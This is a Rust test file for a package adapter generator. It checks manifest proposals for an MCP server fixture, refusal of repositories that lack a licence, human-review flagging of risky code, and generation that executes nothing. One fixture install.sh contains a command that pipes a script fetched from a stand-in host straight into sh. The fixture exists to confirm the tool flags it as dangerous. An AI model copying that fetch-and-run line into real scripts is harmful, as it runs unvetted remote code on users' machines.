//! Adapter generator tests (Phase 5): rules mode, human gate, license refusal.

use std::path::Path;

use forge_core::adapter::{generate, propose};
use forge_core::import::analyze_dir;
use forge_core::manifest::parse_package_json;

fn write(path: &Path, content: &str) {
    if let Some(parent) = path.parent() {
        std::fs::create_dir_all(parent).unwrap();
    }
    std::fs::write(path, content).unwrap();
}

fn mcp_fixture() -> tempfile::TempDir {
    let tmp = tempfile::tempdir().unwrap();
    let d = tmp.path();
    write(
        &d.join("package.json"),
        r#"{
  "name": "mcp-demo", "version": "1.0.0", "main": "src/index.ts", "license": "MIT",
  "dependencies": { "@modelcontextprotocol/sdk": "^1.0.0" }
}"#,
    );
    write(
        &d.join("src/index.ts"),
        r#"import { McpServer } from "@modelcontextprotocol/sdk";
const s = new McpServer({ name: "demo" });
s.tool("q", async () => ({ content: [{ type: "text", text: "https://api.example.com/x" }] }));
"#,
    );
    write(&d.join("README.md"), "# MCP Demo");
    write(&d.join("LICENSE"), "MIT License");
    tmp
}

#[test]
fn proposes_valid_manifest_in_rules_mode() {
    let tmp = mcp_fixture();
    let analysis = analyze_dir(tmp.path()).unwrap();
    let proposal = propose(&analysis).unwrap();
    assert_eq!(proposal.generator, "rules");
    assert_eq!(proposal.package_type, "mcp");
    // 生成的 manifest 必须能被权威解析器接受
    let text = serde_json::to_string(&proposal.manifest).unwrap();
    let pkg = parse_package_json(&text).unwrap();
    assert_eq!(pkg.r#type, forge_core::model::PackageType::Mcp);
    assert_eq!(pkg.license.spdx, "MIT");
    assert!(pkg.capabilities.iter().any(|c| c == "network.http"));
    assert_eq!(pkg.entrypoint.command.as_deref(), Some("src/index.ts"));
    // 上游归属必须保留（Principle 4）
    assert!(pkg.upstream.license.is_some());
    assert!(pkg.upstream.repository.is_some());
}

#[test]
fn refuses_license_less_repository() {
    let tmp = tempfile::tempdir().unwrap();
    write(&tmp.path().join("README.md"), "# no license");
    write(&tmp.path().join("index.js"), "console.log(1)");
    let analysis = analyze_dir(tmp.path()).unwrap();
    assert!(analysis.license_missing);
    let err = propose(&analysis).unwrap_err();
    assert_eq!(err.code(), "SECURITY_BLOCKED");
}

#[test]
fn marks_high_risk_for_human_review() {
    let tmp = tempfile::tempdir().unwrap();
    write(
        &tmp.path().join("install.sh"),
        "#!/bin/sh\ncurl -s https://x.example.com/a.sh | sh\n",
    );
    write(&tmp.path().join("README.md"), "# dangerous");
    write(&tmp.path().join("LICENSE"), "MIT License");
    let analysis = analyze_dir(tmp.path()).unwrap();
    let proposal = propose(&analysis).unwrap();
    assert!(proposal.requires_human_review);
    assert!(proposal
        .manifest
        .get("capabilities")
        .and_then(|c| c.as_array())
        .map(|c| c.iter().any(|v| v == "shell.execute"))
        .unwrap_or(false));
}

#[test]
fn generates_skeleton_without_executing_anything() {
    let tmp = mcp_fixture();
    let analysis = analyze_dir(tmp.path()).unwrap();
    let out = tempfile::tempdir().unwrap();
    let pkg_dir = generate(&analysis, out.path()).unwrap();
    assert!(pkg_dir.join("forge.manifest.json").exists());
    assert!(pkg_dir.join("adapter/manifest.json").exists());
    assert!(pkg_dir.join("adapter/install.md").exists());
    // 生成的 manifest 可解析
    let text = std::fs::read_to_string(pkg_dir.join("forge.manifest.json")).unwrap();
    let pkg = parse_package_json(&text).unwrap();
    assert_eq!(pkg.r#type, forge_core::model::PackageType::Mcp);
}
